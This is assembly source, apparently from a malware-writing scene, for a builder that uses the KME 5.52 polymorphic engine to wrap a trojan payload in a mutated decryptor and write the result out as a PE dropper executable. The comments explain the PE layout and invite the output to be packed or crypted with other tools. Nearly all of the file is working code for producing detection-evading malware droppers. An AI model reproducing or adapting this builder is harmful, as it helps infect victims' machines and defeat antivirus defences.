
 ; generate a dropper using KME. You can adjust the parameters to suit your
 ; mutation needs (see the docs for more info!). generated file is 260K large
 ; beacuse the sample PE file's header is adjusted for that size (if you omit
 ; the filling chars it will crash the Loader because .reloc section is pointing
 ; to the non-existing virtual memory, causing the GPF), and can be easily 
 ; compressed/crypted with any tool of your choise. in future versions, i will
 ; ad it's own internal packer, but for testing/debugging purposes, it's really
 ; not a must.

            invoke  AllocConsole
            call    dump_msg
            db  'test message...', 13, 10, 0
            
            lea edx, kme_msg
            call    dump_asciiz_edx
            call    read_al
            
            xor eax, eax
            push    eax eax eax
            invoke  HeapCreate
    
            mov hhandle, eax
    
            push    execode_size
            push    HEAP_ZERO_MEMORY
            push    hhandle
            invoke  HeapAlloc
    
            mov buf, eax
            xchg    eax, ecx
            jecxz   __exit

            push    FLAG_NOJMPS             ; flagz
            push    CMD_ALL                 ; cmdavail
            push    CMD2_ALL                ; cmdavail2
            push    REG_ALL                 ; regavail
            push    100                 ; jmp_prob
            push    offset buf_entry            ; po_entry
            push    offset buf_size             ; po_size
            push    0                   ; o_fillchar
            push    execode_size                ; o_max 
            push    buf                 ; o_offs
            push    troj_entry-troj_start           ; i_entry
            push    troj_size               ; i_size
            push    offset troj_start           ; i_offs
            push    0                   ; initregptr
            push    0                   ; exitregptr
            push    0                   ; vir_rva
            push    0                   ; original_rva
            push    REG_ALL                 ; regsave
            push    12345678h               ; randseed
            push    1                   ; nlayer
            push    0                   ; tempbufptr
            call    kme_main
            add esp, 4*KME_N_ARGS
    
            cmp     eax, KME_ERROR_SUCCESS
            jz  __success

__exit:         push    hhandle
            invoke  HeapDestroy

            push    0
            invoke  ExitThread

__success:      pusha
            mov eax, buf_entry
            add eax, execode_rva
            mov     exehdr1.dword ptr exeeip_offs, eax  ; set new entry point
    
            mov ecx, execode_size           ; check whether the generated decryptor used less then
            sub ecx, buf_size               ; given space. if so, fill the remaining space with NOPs
            jz  __ok
    
            mov edi, buf
            add edi, buf_size
            mov al, 90h
            cld
            rep stosb

__ok:           popa
    
            lea edx, filename
            call    fcreate
    
            xchg    ebx, eax
            lea edx, exehdr1
            mov ecx, exehdr1_size
            call    fwrite
    
            mov edx, buf
            mov ecx, execode_size
            call    fwrite
    
            lea edx, exehdr2
            mov ecx, exehdr2_size
            call    fwrite
    
            call    fclose  
    
            jmp __exit

kme_msg         label   byte
            
            db  'KME 5.52 used '
            db  (kme_end-kme_start)/1000 mod 10 + '0'
            db  (kme_end-kme_start)/ 100 mod 10 + '0'
            db  (kme_end-kme_start)/  10 mod 10 + '0'
            db  (kme_end-kme_start)/   1 mod 10 + '0'
            db  ' bytes', CRLF, 0
            
include         dropper.inc
